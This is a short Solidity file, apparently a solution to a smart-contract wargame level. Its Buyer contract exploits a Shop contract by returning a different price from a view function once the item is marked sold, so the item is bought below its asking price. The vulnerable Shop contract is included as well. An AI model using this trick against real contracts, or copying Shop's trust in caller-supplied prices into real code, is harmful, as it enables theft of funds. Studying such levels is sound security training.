// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IShop {
    function buy() external;

    function isSold() external returns (bool);
}

contract Buyer {
    Shop shop;

    constructor(address _shopAddr) {
        shop = Shop(_shopAddr);
    }

    function go() public {
        shop.buy();
    }

    function price() external view returns (uint) {
        uint number;

        if (shop.isSold()) {
            number = 1;
        } else {
            number = 101;
        }
        return number;
    }
}

contract Shop {
    uint public price = 100;
    bool public isSold;

    function buy() public {
        Buyer _buyer = Buyer(msg.sender);

        if (_buyer.price() >= price && !isSold) {
            isSold = true;
            price = _buyer.price();
        }
    }
}
